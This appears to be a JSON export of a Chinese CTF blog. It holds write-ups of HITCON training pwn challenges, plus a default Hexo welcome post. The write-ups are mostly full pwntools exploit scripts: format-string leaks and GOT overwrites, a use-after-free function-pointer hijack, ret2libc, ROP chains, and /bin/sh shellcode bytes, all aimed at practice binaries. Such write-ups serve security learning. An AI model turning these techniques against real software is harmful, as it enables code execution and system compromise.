[{"title":"HITCONING training 6-10 writeup","date":"2020-01-07T02:57:55.000Z","path":"2020/01/07/HITCONING-training-6-10-writeup/","text":"migrationemmm, 这题的做法跟前面的一道题差不多， 都可以泄露libc地址，进行栈迁移， 然后执行system函数来getshell， 差不多的思路就不重复写了 crack除了pie和改写重定位表以外的保护都开了 程序逻辑为从urandom文件中读取4个字节作为password， 由于urandom这个文件的内容是随机的， 所以password不可控， 但是后面有个格式化字符串漏洞，并且参数在栈上， 那么可以利用”%10$s” 泄露出password， 之后就可以cat flag了 1234567891011121314151617181920212223242526272829303132333435363738391 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./crack\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./crack\")2627 payload = p32(elf.symbols['password']) + \"%10$s\"28 p.sendlineafter(\"What your name ? \", payload)2930 p.recv(11)31 leak = u32(p.recv(4))32 log.info(\"leak -&gt; \" + hex(leak))3334 p.sendlineafter(\"Your password :\", str(leak))3536 p.interactive()3738 if __name__ == '__main__':39 pwn() cat flag: craxme开了NX和CANARY 又是一个格式化控制字符串漏洞的题目， 不过这次不是要我们泄露数据， 而是向内存中写入数据一个为218一个为0xfaceb00c(-87117812)第一个好解决， 第二个需要分段写入， %hn往内存中写入两个字节 12345678910111213141516171819202122232425262728293031323334351 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./craxme\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./craxme\")2627 #payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$n\".format(218 - 4) flag28 payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$hn&gt;&gt;&gt;&gt;\".format((0xfaceb00c &amp; 0xffff)-4)29 payload += p32(elf.symbols['magic']+2) + \"%&#123;&#125;c%12$hn\".format((0xfaceb00c &gt;&gt; 16) - 0xb00c - 4 - 4)30 p.sendlineafter(\"Give me magic :\", payload)3132 p.interactive()3334 if __name__ == '__main__':35 pwn() cat flag: playfmt= = 格式化字符串漏洞三连… 只开了NX 这题printf的参数不在栈上在bss段， 但是可以无限次利用这个漏洞， 所以思路还是有得， 不过比较麻烦， 覆写got表需要在一次printf调用中完成，这就使得需要很多准备工作 1.利用 序号1 处得两个方框内栈的地址之间的指向关系， 将地址0xff849628 的内容改成strncmp 的got表地址2.再利用 序号2 处的方框内的的栈的地址之间的指向关系， 将地址0xff8496e4 的内容改成strncmp的got表地址+23.之后就是向strncmp_got内写入system的低两个字节， strncmp_got+2内写入system的高两个字节， 这样就可以成功覆盖strncmp的got表内容为system4.最后就是输入buf为/bin/sh 就可以getshell了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485861 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./playfmt\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./playfmt\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 str_got = elf.got['strncmp']2930 p.recvline()31 p.recvline()32 p.recvline()3334 p.sendline(\"%10$p\")35 leak = int(p.recvline()[:-1], 16)3637 payload = \"%&#123;&#125;c%10$hn\\0\".format(str_got &amp; 0xffff)38 p.send(payload.ljust(0xc8, '\\x00'))3940 payload = \"%&#123;&#125;c%6$hn&gt;&gt;\\0\".format((leak &amp; 0xffff) + 2)41 p.send(payload.ljust(0xc8, '\\x00'))4243 payload = \"%&#123;&#125;c%10$hn\".format(str_got &gt;&gt; 16)44 p.send(payload.ljust(0xc8, '\\x00'))4546 payload = \"%8$p\"47 p.send(payload.ljust(0xc8, '\\x00'))4849 p.recvuntil(\"@&gt;&gt;\")50 p.recvuntil(\"@\")51 leak_libc = int(p.recv(10), 16)52 log.info(\"leak_libc -&gt; \" + hex(leak_libc))5354 libc_base = leak_libc - libc.symbols['_IO_2_1_stdout_']55 log.info(\"libc_base -&gt; \" + hex(libc_base))56 system = libc_base + libc.symbols['system']5758 payload = \"&gt;&gt;&gt;%21$p\"59 p.send(payload.ljust(0xc8, '\\x00'))6061 p.recvuntil(\"&gt;&gt;&gt;\")62 leak_stack = int(p.recv(10), 16)63 log.info(\"leak_stack -&gt; \" + hex(leak_stack))64 # strncmp_got + 265 #0xe4 -&gt; 5766 payload = \"%&#123;&#125;c%22$hn\".format((leak_stack &amp; 0xffff) + 2)67 p.send(payload.ljust(0xc8, '\\x00'))6869 payload = \"%&#123;&#125;c%21$hn\".format((str_got &amp; 0xffff) + 2)70 p.send(payload.ljust(0xc8, '\\x00'))7172 payload = \"%&#123;&#125;c%59$hn\".format(str_got &gt;&gt; 16)73 p.send(payload.ljust(0xc8, '\\x00'))7475 payload = \"%&#123;&#125;c%14$hn\".format(system &amp; 0xffff)76 payload += \"%&#123;&#125;c%57$hn\".format((system &gt;&gt; 16) - (system &amp; 0xffff))77 p.send(payload.ljust(0xc8, '\\x00'))7879 payload = '/bin/sh\\0'80 p.send(payload.ljust(0xc8, '\\x00'))8182 p.interactive()8384 if __name__ == '__main__':85 pwn() getshell hacknote开了NX和CANARY 是个堆类型的题目， 在del_note中存在UAF漏洞， 限制的chunk的个数最多为5， 第一时间想到两种利用方式， 1.控制程序中的print_note函数中的函数指针2.进行常规的fastbin attack， 不过限制了chunk的大小， 而且感觉第一种更方便， 所以就用第一种了 利用思路：在print_note中调用的函数指针， 只要控制了函数指针指向system函数就可以达到getshell的目的， 具体步骤 1.创建一个大小大于fastbin大小的chunk， 随后free掉， 在分配一个大小不大于这个chunk的chunk， 随后利用print_note函数泄露libc地址2.这个程序的chunk结构chunk 的 data区data -&gt; &amp;print_note_contentdata+4 -&gt; 输入的数据data+… -&gt; 输入的数据或0 由于箭头指向的malloc是程序中分配的，不可控， 所以需要利用UAF漏洞重用这段chunk来让data -&gt; system 3.释放两个chunk， 在malloc(8)输入数据为p32(system) + “||sh\\0” 即可达成目的 由于题目也准备好了后门， 直接让data-&gt; &amp;magic也行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162631 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./hacknote\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 def add(size, content):26 p.sendlineafter(\"Your choice :\", str(1))27 p.sendlineafter(\"Note size :\", str(size))28 p.sendafter(\"Content :\", content)2930 def free(index):31 p.sendlineafter(\"Your choice :\", str(2))32 p.sendafter(\"Index :\", str(index))3334 def printf(index):35 p.sendafter(\"Your choice :\", str(3))36 p.sendafter(\"Index :\", str(index))3738 add(0x100, 'a') #039 add(0x20, 'b') #140 add(0x20, 'c') #241 free(0)42 add(0x100, '&gt;&gt;&gt;&gt;') #3 -&gt; 043 printf(3)4445 p.recvuntil(\"&gt;&gt;&gt;&gt;\")46 leak = u32(p.recvline()[:-1])47 libc_base = leak - (0xf7f5f7b0 - 0xf7dad000)48 log.info(\"leak -&gt; \" + hex(libc_base))4950 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")51 system = libc_base + libc.symbols['system']5253 free(1)54 free(2)55 raw_input()56 add(8, p32(system) + \"||sh\\0\") #457 printf(1)585960 p.interactive()6162 if __name__ == '__main__':63 pwn() getshell","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"HITCON training 1-5 writeup ","date":"2020-01-05T08:29:00.000Z","path":"2020/01/05/HITCON-training-writeup/","text":"由于期末考的原因， 好久没写题了， 做hitcon training 的题目来熟悉熟悉 sysmagic查看保护可以看到程序没开pie与got， plt 表之类的可以改写 程序逻辑比较简单不啰嗦了， 经过观察buf的值不可控但是flag比较明显是for循环内输出的东西， 而putchar 内的数据代码中都有， 所以第一想法是写个C语言脚本直接输出 1234567891011121314151617 1 #include &lt;stdio.h&gt; 2 #include &lt;string.h&gt; 3 #include &lt;stdlib.h&gt; 4 5 int main(int argc, char **argv)&#123; 6 int d[] = &#123;2036297540, 1801418095, 1601662830, 1601792119, 1952414061, 7 1835884901, 1600484449, 1851880015, 1767859559, 8 1869832051, 1735287135, 1061124466, 63&#125;; 9 char s[] = &#123;7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89,10 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0,11 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91,12 49, 85, 2, 30, 33, 16, 76, 30, 66&#125;;13 for(int i = 0;i &lt;= 0x30;++i)&#123;14 putchar(*((char*)d + i) ^ s[i]);15 &#125;16 return 0;17 &#125; flag: 看到flag的瞬间毫无防备的留下了弱者的泪水， 能动态调试为什么要费时间写脚本呢… orw查看保护除了栈溢出保护其它保护全关了 程序逻辑简单， 要求输入shellcode来执行指令， 不过程序用了沙箱禁用了exceve系统调用， 不过没有禁用read, write, open等系统调用， 所以可以通过执行这三个系统调用直接把flag读出来关于沙箱这篇文章讲的比较详细：seccomp学习笔记通过执行seccomp-tools dump ./orw 可以查看可以执行哪些系统调用系统调用号查询:linux 系统调用号表 汇编代码(我用的是ATT格式)： 12345678910111213141516171819202122232425262728291 .section .text2 .globl _start3 4 _start:5 xor %eax, %eax6 movl $0x804A09b, %ebx7 movl $4, %ecx8 xor %edx, %edx9 movb $5, %al10 int $0x8011 12 movl %eax, %ebx13 pushl %esp14 movl %esp, %ecx15 movl $0x30, %edx16 xor %eax, %eax17 movb $3, %al18 int $0x8019 20 movl $1, %ebx21 pushl %esp22 popl %ecx23 movl $0x30, %edx24 xor %eax, %eax25 movb $4, %al26 int $0x8027 28 movl $1, %eax29 int $0x80 成功读取flag(由于没有靶机， 所以我在本地创建了一个flag文件) ret2sc保护全关 看到程序逻辑就是栈迁移执行shellcode具体步骤为将shellcode植入到bss段， 之后再将栈迁移到bss段中，然后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435361 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./ret2sc\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2sc\")2627 shellcode = p32(elf.symbols['name'] + 4) + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"28 p.sendlineafter(\"Name:\", shellcode)2930 payload = 'a'*(0x14+8) + p32(elf.symbols['name'] - 4) + p32(0x804853c)31 p.sendlineafter(\"Try your best:\", payload)3233 p.interactive()3435 if __name__ == '__main__':36 pwn() 成功getshell ret2lib除了栈上数据不可执行以外的保护全关了 程序逻辑分析：程序中可以指定一个地址并且输出这个地址的内容， 随后的print_message函数中很明显存在栈溢出 那么思路就比较明了了， 先泄露libc地址， 随后计算出libc基址，之后利用栈溢出执行system， 最后getshell由于泄露地址后可以直接利用LibcSearcher 搜索出libc版本， 为了方便我直接用本机的libc版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445461 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./ret2lib\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2lib\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 p.sendlineafter(\"Give me an address (in dec) :\", str(elf.got['puts']))29 leak = hex(int(p.recvline()[-9:-1], 16))30 log.info(\"leak -&gt; \" + leak)3132 libc_base = int(leak, 16) - libc.symbols['puts']33 log.info(\"libc_base -&gt; \" + hex(libc_base))3435 system = libc_base + libc.symbols['system']36 binsh = libc_base + libc.search('/bin/sh\\0').next()3738 pppr = 0x080486CD39 payload = 'a'*(0x38 + 4) + p32(system) + p32(0x12345678) + p32(binsh)4041 p.sendlineafter(\"Leave some message for me :\", payload)4243 p.interactive()4445 if __name__ == '__main__':46 pwn() 成功getshell simplerop除了NX其它全关 观察程序逻辑只有一个栈溢出， 而这个文件是个静态链接的文件，尝试找system的地址， 但是查找符号表没找到system但是open, write, read的地址都可以找到， 这意味着跟前面的题目思路一样， 利用rop调用这三个函数来读取flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546471 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./simplerop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./simplerop\")2627 pppr = 0x080491D22829 payload = 'a'*(0x1c + 4) + p32(elf.symbols['read']) + p32(pppr)30 payload += p32(0) + p32(elf.bss() + 0x200) + p32(0x10) + p32(elf.symbols['main'])3132 p.sendafter(\"Your input :\", payload.ljust(100, '\\x00'))3334 p.sendline(\"flag\\0\")3536 raw_input()37 payload = 'a'*0x1838 payload += p32(elf.symbols['open']) + p32(pppr) + p32(elf.bss() + 0x200) + p32(4) + p32(0)39 payload += p32(elf.symbols['read']) + p32(pppr) + p32(3) + p32(elf.bss() + 0x200) + p32(0x10)40 payload += p32(elf.symbols['write']) + p32(pppr) + p32(1) + p32(elf.bss() + 0x200) + p32(0x10)4142 p.sendlineafter(\"Your input :\", payload)4344 p.interactive()4546 if __name__ == '__main__':47 pwn() 结果:","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"Hello World","date":"2019-12-19T13:45:35.530Z","path":"2019/12/19/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]